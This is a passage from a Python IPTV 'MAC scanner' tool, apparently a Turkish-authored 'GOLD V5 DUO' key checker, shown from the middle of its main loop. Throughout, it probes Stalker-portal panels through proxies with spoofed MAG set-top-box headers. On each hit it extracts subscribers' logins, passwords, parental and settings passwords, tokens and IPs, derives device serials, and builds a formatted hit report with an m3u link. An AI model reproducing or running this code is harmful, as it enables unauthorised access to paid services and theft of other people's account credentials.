            else:
            	renk="\33[95m"
            
            say=say+1
            #print(token)➤ x=➤ 
            total=str(say) 
            cpm=(time.time()-cpm)
            cpm=(round(60/cpm))
            cosku=("""\33[0m╭─────\33[0m\33[1;30;107m \33[0m\33[1;44;101mGOLD \33[1;30;107mV5 \33[0m\33[1;100m \33[1;41mDUO \33[1;30;107m \33[1;92m  𝗞𝗲𝘆𝗖𝗵𝗲𝗰𝗸  𝘃5 ✅ \33[0m
\33[0m├──\33[1;36m  Total ➤ """+total+"""  \33[33mHit ➤ """ + str(hit)+ """  \33[1;31;40m Cpm ➤ """ +str(cpm)+""" \33[0m  
\33[0m╰──── \33[1;31;40m〘"""+renk+mac+"""\33[1;30;107m\33[1;31;40m〙
 ╰── \33[1;32;40m〘""" +panel+"""〙
\33[0m╭─────\33[1;91m〘 My Os ➤ """ +my_os+"""〙
\33[0m├──\33[1;92m〘 My Cpu ➤ """ +str(my_cpu)+"""〙
\33[0m╰────\33[1;93m〘 My Py ➤ """ +my_py+"""〙
""" )
			
			
			
            print(cosku) 
            cpm=time.time()
            if 'token' in veri:
            	
            
	            HEADERd={
	"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FIstanbul;",
	"Referer": "http://"+panel+"/c/",
	"X-User-Agent":"Model: MAG322; Link: Ethernet",
	"Accept": "*/*",
	"Connection": "Keep-Alive",
	"Authorization": "Bearer "+token,
	"Host": panel.replace('/stalker_portal',''),
	"Accept-Encoding": "gzip",
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" ,
	            }
	            
	         
	            url2="http://"+panel+"/"+uzmanm+"?type=stb&action=get_profile&JsHttpRequest=1-xml" 
	          
	            while True:
	            	try:
	            		res = ses.get(url2,proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
	            		break
	            	except:pass
	            		#bag1=bag1+1
#	            		time.sleep(bekleme)
#	            		if bag1==4:
#	            			quit()
	            bag1=0
	            		
	            	
	            veri=""
	            veri=str(res.text)
	            id='null'
	            try:
	            	id=veri.split('{"js":{"id":')[1]
	            	id=id.split(',"name')[0]
	            except:pass
	            
	            if not id  == 'null':
	            	
		            #print(veri)
		            #quit()
		            ip=""
		            fname=""
		            stb_id=""
		            stb_type=""
		            tplan=""
		            fname=""
		            adult=""
		            user=""
		            passw=""
		            tarrif=""
		            if "expire_billing_date" in veri:
		            	stb_id=veri.split('id":"')[1]
		            	stb_id=stb_id.split('"')[0]
		            	
		            	stb_type=veri.split('"stb_type":"')[1]
		            	stb_type=stb_type.split(',')[0]
		            	stb_type=stb_type.replace('"',"")
		            	
		            	tplan=veri.split('"tariff_plan_id":"')[1]
		            	tplan=tplan.split('"')[0]
		            	
		            	fname=veri.split('"fname":"')[1]
		            	fname=fname.split('"')[0]
		            	
		            	adult=veri.split('parent_password":"')[1]
		            	adult=adult.split('"')[0]
		            	try:
		            		ip=veri.split('ip":"')[1]
		            		ip=ip.split('"')[0]
		            	except:pass
		            	
		            	timezon=veri.split('"default_timezone":"')[1]
		            	timezon=timezon.split(',')[0]
		            	timezon=timezon.replace('"',"")
		            	
		            	user=veri.split('"login":')[1]
		            	user=user.split(',')[0]
		            	user=user.replace('"',"")
		            	
		            	passw=veri.split('","password":')[1]
		            	passw=passw.split(',')[0]
		            	passw=passw.replace('"',"")
		            	passw=passw.replace('"','')
		            	
		            	sespas=veri.split('"settings_password":"')[1]
		            	sespas=sespas.split(',')[0]
		            	sespas=sespas.replace('"',"")
		            	
		            	sbitis=veri.split('expire_billing_date":')[1]
		            	sbitis=sbitis.split(',')[0]
		            	sbitis=sbitis.replace('"',"")
		            	if sbitis=="null":
		            		sbitis="Unlimited"
		            		
		            if 'play_token' in veri:
		            	adult=veri.split('parent_password":"')[1]
		            	adult=adult.split('"')[0]
		            	acount_id=veri.split('name":"')[1]
		            	acount_id=acount_id.split('"')[0]
		            	stb_id=veri.split('id":"')[1]
		            	stb_id=stb_id.split('"')[0]
		            	stb_type=veri.split('"stb_type":"')[1]
		            	stb_type=stb_type.split('"')[0]
		            	sespas=veri.split('"settings_password":"')[1]
		            	sespas=sespas.split('"')[0]
		            	stb_c=veri.split('"client_type":"')[1]
		            	stb_c=stb_c.split('"')[0]
		            	timezon=veri.split('"default_timezone":"')[1]
		            	timezon=timezon.split('"')[0]
		            	tloca=veri.split('"default_locale":"')[1]
		            	tloca=tloca.split('"')[0]
		            	if 'ip' in veri:
		            		try:
		            			ip=veri.split('ip":"')[1]
		            			ip=ip.split('"')[0]
		            		except:pass
		            
		            bag1=0
		            url3="http://"+panel+"/"+uzmanm+"?action=get_main_info&type=account_info"
		            while True:
		            	try:
		            		res = ses.get(url3, proxies =proxies,  headers=HEADERd, timeout=15, verify=False)
		            		break
		            	except:pass
		            		#bag1=bag1+1
#		            		time.sleep(bekleme)
#		            		if bag1==4:
#		            			quit()
		            
		            bag1=0
		            veri=""
		            veri=str(res.text)
		            
		            
		            if not veri.count('phone')==0 or not fname=="":
		            	hit=hit+1
		            	if rootDir == "./":
			                playsound(rootDir+'sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3')
			                file = pathlib.Path()
			                try:
				                if file.exists():
					                ad.mediaPlay()
			                except:pass
			
		            	if rootDir == "/sdcard/":
			                sesdosya=rootDir+"sounds/8d82b5_Call_Of_Duty_AK-47_Firing_Sound_Effect.mp3"
			                file = pathlib.Path(sesdosya)
			                try:
				                if file.exists():
					                ad.mediaPlay(sesdosya)
			                except:pass
		            	print('\n\33[31m   Papy  \33[0m\n\33[32m   Gogo \33[0m\n\33[1;91m  (҂`_´) ,■▬╦̵̵̿╤── \33[0m\33[1;92m҉ - -- -- -- \33[0m')
		            	#print(veri)
		            	if 'tariff_plan' in veri:
		            		tarrif=veri.split('tariff_plan":"')[1]
		            		tarrif=tarrif.split('"')[0]
		
		            	
		            	if 'end_date' in veri:
		            		#print(veri)
		            		trh=veri.split('end_date":"')[1]
		            		trh=trh.split('"')[0]
		            	else:
		            		trh=veri.split('phone":"')[1]
		            		trh=trh.split('"')[0]
		            		if not fname=="":
		            			if trh=="":
		            				trh=sbitis
		            	#print(trh)
		            	#print(kisacikti)
		            	if not kisacikti=="1":
		            		#print("boş")
			            	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			            	SNENC=SN.upper()
			            	SNCUT=SNENC[:13]
			            	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			            	DEVENC=DEV.upper()
			            	SG=SNCUT+'+'+(mac)
			            	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			            	SINGENC=SING.upper()
			            	url5="http://"+panel+"/"+uzmanm+"?type=itv&action=get_genres&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_genres&type=itv&JsHttpRequest=1-xml"
			            	kategori="hata"
			            	if kanalkata=="1" or kanalkata=="2" :
			            		while True:
			            			try:
			            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            				break
			            			except:pass
			            				#bag1=bag1+1
#			            				time.sleep(bekleme)
#			            				if bag1==4:
#			            					quit()
			            		bag1=0
			            			
			            		veri=str(res.text)
				            	if veri.count('title":"')>1:
				            		for i in veri.split('title":"'):
				            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				            			kategori=kategori+kanal+" «♦️» "
				            			#⚡️✨💫
				            		if '*' in kategori:
				            			try:
				            				kategori=kategori.split("*")[1]
				            			except:pass
				            		kategori=kategori.replace("\/","/")
				            		kategori=kategori.replace('hata{"js":[{"id":"','')
				            		kategori=kategori.replace('hata{ ','')
			            		
			            	#print(kategori)
			            	url5="http://"+panel+"/"+uzmanm+"?type=vod&action=get_categories&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
			            	kategoriv="hata"
			            	if kanalkata=="2" :
			            		while True:
			            			try:
			            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            				break
			            			except:pass
			            				#bag1=bag1+1
#			            				time.sleep(bekleme)
#			            				if bag1==4:
#			            					quit()
			            		bag1=0
			            			
			            		veri=str(res.text)
				            	if veri.count('title":"')>1:
				            		for i in veri.split('title":"'):
				            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				            			kategoriv=kategoriv+kanal+" «🔶» "
				            			#⚡️✨💫
				            		if '*' in kategoriv:
				            			try:
				            				kategoriv=kategoriv.split("*")[1]
				            			except:pass
				            		kategoriv=kategoriv.replace("\/","/")
				            		kategoriv=kategoriv.replace('hata{"js":[{"id":"','')
				            		kategoriv=kategoriv.replace('hata{ ','')
			            	#print(kategori)
			            	url5="http://"+panel+"/"+uzmanm+"?type=series&action=get_categories&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_categories&type=vod&JsHttpRequest=1-xml"
			            	kategoris="hata"
			            	if kanalkata=="2" :
			            		while True:
			            			try:
			            				res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            				break
			            			except:pass
			            				#bag1=bag1+1
#			            				time.sleep(bekleme)
#			            				if bag1==4:
#			            					quit()
			            		bag1=0
			            			
			            		veri=str(res.text)
				            	if veri.count('title":"')>1:
				            		for i in veri.split('title":"'):
				            			kanal= str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				            			kategoris=kategoris+kanal+" «🔷» ️ "
				            			#⚡️✨💫
				            		if '*' in kategoris:
				            			try:
				            				kategoris=kategoris.split("*")[1]
				            			except:pass
				            		kategoris=kategoris.replace('\/','')
				            		kategoris=kategoris.replace('hata{"js":[{"id":"','')
				            		kategoris=kategoris.replace('hata{ ','')
				            		
			            		
			            	#print(kategori)            	
			            	#url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml&sortby=latest"
			#            	
			#            	while True:
			#            		try:
			#            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			#            			break
			#            		except:
			#            			bag1=bag1+1
			#            			time.sleep(bekleme)
			#            			if bag1==4:
			#            				break
			#            	bag1=0
			#            	veri=str(res.text)
			#            	print(veri)
			#            	quit()
			            	
			            	
			            	
			            	
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=series&p=1&JsHttpRequest=1-xml"
			            	url5="http://"+panel+"/"+uzmanm+"?action=get_ordered_list&type=itv&p=1&JsHttpRequest=1-xml"
			            	token2="play_token" 
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:pass
				            			#bag1=bag1+1
#				            			time.sleep(bekleme)
#				            			if bag1==4:
#				            				break
			            	bag1=0
			            	veri=str(res.text)
			            	#print(veri)
			            	if 'cmd' in veri:
			            		token2=veri.split('cmd":"')[1]
			            		token2=token2.split('"')[0]
			            	#print(token2)
			            	real=panel
			            	
			            	
			            	
			            	
			            	
			            	
			#            	HEADERd={
			#"Host":panel,            	
			#"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" ,
			#"X-User-Agent": "Model: MAG254; Link: Ethernet,WiFi" ,
			#"Referer": "http://"+panel+"/c/" ,
			#"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
			#"Accept-Language": "en-US,*",
			#"Accept-Charset": "UTF-8,*;q=0.8",
			#"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe%2FParis; adid=b01850af81da130f1f4407a96da5b48c" ,
			#"Accept-Encoding": "gzip, deflate" ,
			#"Connection": "Keep-Alive" ,
			#"Authorization": "Bearer "+token,
			#            }
			            	url5="http://"+real+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/1823_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml" 
			            	url5="http://"+panel+"/"+uzmanm+"?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"
			            	userm=user
			            	pasdm=passw
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:pass
			            		#	bag1=bag1+1
#			            			time.sleep(bekleme)
#			            			if bag1==4:
#			            				break
			            	bag1=0
			            	veri=str(res.text)
			            	#print(veri)
			            	#print(play_token)
			            	#quit()
			            	try:
			            		veri=veri.replace('live\/', '') 
			            		real=veri.split('\/')[2]
			            		userm=veri.split('\/')[3]
			            		pasdm=veri.split(userm+'\/')[1]
			            		pasdm=pasdm.split('\/')[0]
			            	except:pass
			            	#print(userm)
			#            	HEADERd={
			#"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36" ,
			#"Referer": "http://"+panel+"/c/" ,
			#"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
			#"Cookie": "mac="+macs+"; stb_lang=en; timezone=Europe/Paris;",
			#"Accept-Encoding": "gzip, deflate" ,
			#"Connection": "Keep-Alive" ,
			#"X-User-Agent":"Model: MAG254; Link: Ethernet",
			#"Authorization": "Bearer "+token,
			#            }
			            	if userm=="hata":
			            			url5="http://"+real+"/"+uzmanm+"?action=create_link&type=vod&cmd="+token2+"&JsHttpRequest=1-xml"
			            			url5="http://"+real+"/"+uzmanm+"?action=create_link&type=itv&cmd="+token+"&JsHttpRequest=1-xml"
			            			while True:
			            				try:
			            					res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            					break
			            				except:pass
			            					#bag1=bag1+1
#			            					time.sleep(bekleme)
#			            					if bag1==4:
#			            						break
			            			bag1=0
			            			try:
			            				real=veri.split('\/')[2]
			            				userm=veri.split('\/')[4]
			            				pasdm=veri.split('\/')[5]
			            			except:pass
			            			
			            	realm=real
			            	
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_live_streams"
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:pass
			            			#bag1=bag1+1
#			            			time.sleep(bekleme)
#			            			if bag1==4:
#			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	kanalsayisi=str(veri.count("stream_id"))
			            	#print(kanalsayisi)
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_vod_streams"
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:pass
			            			#bag1=bag1+1
#			            			time.sleep(bekleme)
#			            			if bag1==4:
#			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	filmsayisi=str(veri.count("stream_id"))
			            	
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm+"&action=get_series"
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:pass
			            			#bag1=bag1+1
#			            			time.sleep(bekleme)
#			            			if bag1==4:
#			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	dizisayisi=str(veri.count("series_id"))
			            	if not fname=="":
			            		userm=user
			            		pasdm=passw
			            	url5="http://"+panel+"/player_api.php?username="+userm+"&password="+pasdm
			            	while True:
			            		try:
			            			res = ses.get(url5, proxies =proxies, headers=HEADERd, timeout=15, verify=False)
			            			break
			            		except:pass
			            			#bag1=bag1+1
#			            			time.sleep(bekleme)
#			            			if bag1==4:
#			            			 	break
			            	bag1=0
			            	veri=str(res.text)
			            	#print(veri)
			            	acon="" 
			            	if 'active_cons' in veri:
			            		try:
					            	#print(veri)
					            	acon=""
					            	acon=veri.split('active_cons":')[1]
					            	acon=acon.split(',')[0]
					            	acon=acon.replace('"',"")
					            	
					            	mcon=veri.split('max_connections":')[1]
					            	mcon=mcon.split(',')[0]
					            	mcon=mcon.replace('"',"")
					            	
					            	status=veri.split('status":')[1]
					            	status=status.split(',')[0]
					            	status=status.replace('"',"")
					            	
					            	timezone=veri.split('timezone":"')[1]
					            	timezone=timezone.split('",')[0]
					            	timezone=timezone.replace("\/","/")
					            	
					            	realm=veri.split('url":')[1]
					            	realm=realm.split(',')[0]
					            	realm=realm.replace('"',"")
					            	#print(realm)
					            	portal=panel
					            	port=veri.split('port":')[1]
					            	port=port.split(',')[0]
					            	port=port.replace('"',"")
					            	
					            	user=veri.split('username":')[1]
					            	user=user.split(',')[0]
					            	user=user.replace('"',"")
					            	
					            	passw=veri.split('password":')[1]
					            	passw=passw.split(',')[0]
					            	passw=passw.replace('"',"")
					            	
					            	bitis=veri.split('exp_date":')[1]
					            	bitis=bitis.split(',')[0]
					            	bitis=bitis.replace('"',"")
					            	if bitis=="null":
					            		bitis="Unlimited"
					            	else:
					            		bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
					            	bitis=bitis
			            		except:pass
			            	
			
			
			            	if not ip=="":
			            		utc_offset=""
			            		org1=""
			            		asn1=""
				            	url5="http://worldtimeapi.org/api/ip/"+ip
				            	while True:
				            		try:
				            			res = ses.get(url5, proxies =proxies,  timeout=15, verify=False)
				            			break
				            		except:pass
				            			#bag1=bag1+1
#				            			time.sleep(bekleme)
#				            			if bag1==4:
#				            				break
				            	
				            	try:
				            		bag1=0
				            		veri=str(res.text)
				            		abbreviation=veri.split('abbreviation":"')[1]
				            		abbreviation=abbreviation.split('"')[0]
				            		datetime=veri.split('datetime":"')[1]
				            		datetime=datetime.split('"')[0]
				            		utc_offset1=veri.split('utc_offset":"')[1]
				            		utc_offset1=str(utc_offset1.split('"')[0])
				            		
				            	except:pass
				            	#url5="https://ipapi.co/"+ip+"/json/" 
#				            	while True:
#				            		try:
#				            			res = ses.get(url5, proxies =proxies,  timeout=15, verify=False)
#				            			break
#				            		except:
#				            			bag1=bag1+1
#				            			time.sleep(bekleme)
#				            			if bag1==4:
#				            				break
#				            	
#				            	try:
#				            		bag1=0
#				            		languages="" 
#				            		postal="" 
#				            		Timezone=""
#				            		country_code=""
#				            		country_name =""
#				            		country_capital=""
#				            		region=""
#				            		currency=""
#				            		languages=""
#				            		city=""
#				            		asn1=""
#				            		org1=""
#				            		utc_offset=""
#				            		continent_code=""
#				            		country_tld=""
#				            		veri=str(res.text)
#				            		#print(veri)
#				            		Timezone=veri.split('timezone": "')[1]
#				            		Timezone=Timezone.split('"')[0]
#				            		country_code=veri.split('country_code": "')[1]
#				            		country_code=country_code.split('"')[0]
#				            		country_code_iso3=veri.split('country_code_iso3": "')[1]
#				            		country_code_iso3=country_code_iso3.split('"')[0]
#				            		continent_code=veri.split('continent_code": "')[1]
#				            		continent_code=continent_code.split('"')[0]
#				            		country_tld=veri.split('country_tld": "')[1]
#				            		country_tld=country_tld.split('"')[0]
#				            		country_name=veri.split('country_name": "')[1]
#				            		country_name=country_name.split('"')[0]
#				            		region=veri.split('region": "')[1]
#				            		region=region.split('"')[0]
#				            		city=veri.split('city": "')[1]
#				            		city=city.split('"')[0]
#				            		country_capital=veri.split('"country_capital": "')[1]
#				            		country_capital=country_capital.split('"')[0]
#				            		postal=veri.split('postal": "')[1]
#				            		postal=postal.split('"')[0]
#				            		utc_offset=veri.split('utc_offset": "')[1]
#				            		utc_offset=utc_offset.split('"')[0]
#				            		languages=veri.split('languages": "')[1]
#				            		languages=languages.split('"')[0]
#				            		org1=veri.split('"org": "')[1]
#				            		org1=org1.split('"')[0]
#				            		currency=veri.split('currency": "')[1]
#				            		currency=currency.split('"')[0]
#				            		asn1=veri.split('"asn": "')[1]
#				            		asn1=asn1.split('"')[0]	
#				            	except:pass
				            	url5="https://iplist.cc/api/"+ip
				            	while True:
				            		try:
				            			res = ses.get(url5, proxies =proxies, timeout=15, verify=False)
				            			break
				            		except:pass
				            			#bag1=bag1+1
#				            			time.sleep(bekleme)
#				            			if bag1==4:
#				            				break
				            	
				            	try:
				            		bag1=0
				            		veri=str(res.text)
				            		ServerISP=""
				            		ServerRegistry=""
				            		ServerLocation=""
				            		if not 'title' in veri:
				            			ServerISP=veri.split('name": "')[1]
				            			ServerISP=ServerISP.split('"')[0]
				            			ServerRegistry=veri.split('registry": "')[1]
				            			ServerRegistry=ServerRegistry.split('"')[0]
				            			ServerLocation=veri.split('countryname": "')[1]
				            			ServerLocation=ServerLocation.split('"')[0]
				            		
				            	except:pass            	
			            	try:
			            		
			            		pal=panel.split(':')[0]
			            		pal=pal.replace('/stalker_portal','')
			            		yanpanel1="hata" 
				            	yanpanel="hata" 
				            	url= "http://ipv4info.com/?act=check&ip="+pal
				            	res = ses.get(url, timeout=15, verify=False)
				            	veri=str(res.text)
				            	yan=""
				            	yanlar=veri
				            	yanpanel="hata"
				            	if veri.count("Site info ")>0:
				            	    for i in veri.split('Site info ('):
				            	    	yan=yan+(i.split(')')[0])+" 🌎 "
				            	    	yanpanel=(yan.split('(')[1])
				            	else:
						   		       yan1=veri.split('href="/ip-address')[1]
						   		       yan1=yan1.split('">')[0]
						   		       url="http://ipv4info.com/ip-address"+yan1
						   		       res = ses.get(url, timeout=15, verify=False)
						   		       veri=str(res.text)
						   		       if veri.count("Site info ")>0:
						   		             for i in veri.split('Site info ('):
						   		              yan=yan+(i.split(')')[0])+" 🌎 "
						   		              yanpanel=(yan.split('(')[1])
						   		
						   	#else:
				            	if not realm==panel:
				            		pal=realm.split(':')[0]
				            		url= "http://ipv4info.com/?act=check&ip="+pal
				            		res = ses.get(url, timeout=15, verify=False)
				            		veri=str(res.text)
				            		yan=""
				            		yanpanel1="hata"
				            		if veri.count("Site info ")>0:
				            		   for i in veri.split('Site info ('):
				            		   	if yanpanel.count(i.split(')')[0])==0:
				            		   		yan=yan+(i.split(')')[0])+" 🌎 "
				            		   		yanpanel1=(yan.split('(')[1])
				            		else:
				            			yan1=veri.split('href="/ip-address')[1]
				            			yan1=yan1.split('">')[0]
				            			url="http://ipv4info.com/ip-address"+yan1
				            			res = ses.get(url, timeout=15, verify=False)
				            			veri=str(res.text)
				            			if veri.count("Site info ")>0:
						   		         for i in veri.split('Site info ('):
						   		          	  if yanpanel.count(i.split(')')[0])==0:
						   		          	   	yan=yan+(i.split(')')[0])+" 🌎 "
						   		          	   	yanpanel1=(yan.split('(')[1])
						   		
				            	if not yanpanel1=="hata" :
				            		yanpanel=yanpanel+yanpanel1
				            	yanpanel=yanpanel.replace(" 🌎  🌎 "," 🌎 ")
			            	except:pass
			            		
			            	
			            	mlink="http://"+ panel + "/get.php?username=" + userm + "&password=" + pasdm + "&type=m3u_plus"
			            	imzaa=""
			            	imzab=""
			            	imzak=""
			            
			            	if not fname=="":
			            		panell=panel+'/stalker_portal'
			            	else:
			            		panell=panel
			            	imzaip1=""
			            	imzaip2=""
			            	imzaip3=""
			            	
			            	if not ip=="":
			            		try:
			            			if not ServerISP=="":
			            				imzaip1=("""
╠ «💠» ??𝗼𝗺𝗮𝗶𝗻𝗜𝗦𝗣➨"""+ServerISP+"""
╠ «💠» 𝗦𝗲𝗿𝘃𝗲𝗿𝗥𝗲𝗴𝗶𝘀𝘁𝗿𝘆➨"""+ServerRegistry+""" 
╠ «💠» 𝗦𝗲𝗿𝘃𝗲𝗿𝗟𝗼𝗰𝗮𝘁𝗶𝗼𝗻➨"""+ServerLocation+"""""")
			            			imzaip2=("""
╠ «💠» 𝗦𝗰𝗮𝗻𝗧𝗶𝗺𝗲➨"""+str(datetime)+"""|"""+str(abbreviation)+""" """)
			            		
			            		except:pass	
			# » » »
			            	imza1=("""
"""+nickn+"""
╠ «⭕️» 𝗚𝗢𝗟𝗗 V5 𝗗𝐔𝗢 🅟🅨  «⭕️»
╠ «⭕️» 𝐌𝐘 𝐎𝐒➨"""+my_os+"""           
╠ «⭕️» 𝐌𝐘 𝐂𝐏𝐔➨"""+str(my_cpu)+"""           
╠ «⭕️» 𝐌️𝐘 𝐏𝐘➨"""+my_py+"""  
╠ «⭕️» 𝗚𝗢𝗟𝗗 V5 𝗗𝐔𝗢 🅟🅨  «⭕️»
╠ «⭕️» 🅟🅐🅝??🅛➨http://"""+panell+"""/c/
╠ «⭕️» 🅡🅔🅐🅛➨http://"""+real+"""/c
╠ «⭕️» 🅜🅐🅒➨"""+mac+"""
╠ «⭕️» 🅔🅧🅟➨"""+trh+"""
╠ «⭕️» Type/Scan date ➤ """+uzmanm+"""/"""+str(time.strftime("%Y:%m:%d"))+"""
╠ «⭕️» """+nickn+"""«⭕️» """)
			            	if not adult =="":
			            		imzaa=("""
╠ «💠» ᴀᴄɴ•ɪᴅ➨"""+acount_id+"""
╠ «💠» ꜱᴛʙ•ɪᴅ➨"""+stb_id+"""
╠ «💠» ꜱᴛʙᴛɪᴘɪ➨"""+stb_type+"""
╠ «💠» ᴄʟɪᴇɴᴛᴛɪᴘɪ➨"""+stb_c+"""
╠ «💠» ᴀ.ᴘᴀꜱꜱ➨"""+adult+"""
╠ «💠» ꜱ.ᴘᴀꜱꜱ➨"""+sespas+"""
╠ «💠» ᴘʟᴀʏᴛᴏᴋᴇɴ➨"""+play_token+"""
╠ «💠» ɪᴘ➨"""+ip+"""
╠ «💠» ᴛɪᴍᴇᴢᴏɴᴇ➨"""+timezon.replace('\/','/')+"""
╠ «💠» ʟᴏᴄᴀʟ➨"""+tloca+"""
╠«💠» 𝗚𝗢𝗟𝗗 V5 𝗗𝐔𝗢 🅟🅨  «💠»""")
			            		if not fname=="":
			            			imzaa=("""
╠ «💠» User➨"""+user+"""
╠ «💠» Pass➨"""+passw+"""
╠ «💠» StbId➨"""+stb_id+"""
╠ «💠» StbType➨"""+stb_type+"""
╠ «💠» INFO➨"""+fname+"""
╠ «💠» A.Pass➨"""+adult+"""
╠ «💠» S.Pass➨"""+sespas+"""
╠ «💠» PlanID➨"""+tplan+"""
╠ «💠» TrarrifPlan➨"""+tarrif+"""
╠ «💠» TimeZone➨"""+timezon.replace('\/','/')+"""
╠ «💠» Ip➨"""+ip+"""
╠❖«⭕️» """+nickn+""" «⭕️»❖""")
			            			
			            			
			            			
				   #except:pass
			            	imza2=""
			            	if not acon=="":
			            		imza2=("""
╠ «💫» 𝗛𝗼𝘀𝘁➨http://"""+portal+"""/c/
╠ «💫» 𝐑𝐞𝐚𝐥➨http://"""+realm+""":"""+port+"""/c
╠ «💫» 𝗣𝗼𝗿𝘁➨"""+port+"""
╠ «💫» 𝗨𝘀𝗲𝗿➨"""+user+"""
╠ «💫» 𝗣𝗮𝘀𝘀➨"""+passw+"""
╠ «💫» 𝗘𝘅𝗽𝘁➨"""+bitis+""" 
╠ «💫» 𝐀𝐜𝐭𝐢𝐨𝐧𝐂𝐨𝐧➨"""+acon+"""
╠ «💫» 𝗠𝗮𝗸𝘀𝗶𝗺𝘂𝗺𝗖𝗼𝗻➨"""+mcon+""" 
╠ «💫» 𝗦𝘁𝗮𝘁𝘂𝘀➨"""+status+"""
╠ «💫» 𝗧𝗶𝗺𝗲𝗭𝗼𝗻𝗲➨"""+timezone+"""
╠═➨  """+nickn+"""
╠ «💠» 𝗖𝗼𝘂𝗻𝘁𝗿𝗶𝗲𝘀𝗖𝗼𝘂𝗻𝘁➨"""+kanalsayisi+"""
╠ «💠» 𝗩𝗼𝗱𝗖𝗼𝘂𝗻𝘁➨"""+filmsayisi+"""
╠ «💠» 𝗦𝗲𝗿𝗶𝗲𝗖𝗼𝘂𝗻𝘁➨"""+dizisayisi+"""
╠⭕️ """+nickn+""" ⭕️""")
			            	imzasif=("""
╠ «🔑» 𝗦𝗲𝗿𝗶𝗮𝗹➨"""+SNENC+"""
╠ «🔑» 𝗦𝗲𝗿𝗶𝗮𝗹𝗖𝘂𝘁➨"""+SNCUT+"""
╠ «🔑» 𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗_𝟭➨"""+DEVENC+"""
╠ «🔑» 𝗗𝗲𝘃𝗶𝗰𝗲𝗜𝗗_𝟮➨"""+SINGENC+"""
╠ «🔑» 𝗠ʏ 𝐎𝘀➨"""+my_os+"""           
╠ «🔑» 𝗠ʏ 𝐂𝗣𝐔➨"""+str(my_cpu)+"""           
╠ «🔑» 𝗠ʏ 𝗣ʏ➨"""+my_py+"""  
╠═╣"""+nickn+""" """)
			            	imza3=("""
╠ «💠» 𝖒3𝖚_𝖀𝖗𝖑 ➨ """+mlink+"""
╠═╣ᴘʏᴛʜᴏɴ 𝗚𝗢𝗟𝗗 V5 𝗗𝐔𝗢 🅟🅨 ╠""")
			            	#print(yanpanel)
			            	if not yanpanel=="hata":
			            		imzayan=("""
╠ «💠» 🅨🅐🅝🅟🅐🅝🅔🅛🅛🅔🅡 ➨ """+yanpanel.replace(" 🌎","\n╠ «💠» ♦️")+""""""+nickn+""" ️""")
			            	if kanalkata=="1" or kanalkata =="2":
			            		imzab=("""
╠ ⭕️»"""+nickn+""" «⭕️
╠ «💠» 🅻🅸🆅🅴 ➨  📽   ➨        		
╠ «💠» """+kategori+""" """)
			#⚡️✨💫
			            	if kanalkata =="2":
			            		imzak=("""
╠ «💠» 🆅🅾🅳 ➨ 📽  ➨
╠ «💠» """+kategoriv+"""
╠ «💠» 🆂🅴🆁🅸🅴 ➨  📽  ➨
╠ «💠» """+kategoris+""" """)
			            	imzas=("""
╚═ᴾʸᵗʰᵒⁿ 𝐌𝐎𝗗 ᵇʸ ᴾᵃᴾʸ 𝗚ᵒ𝗚ᵒ ══╝""")
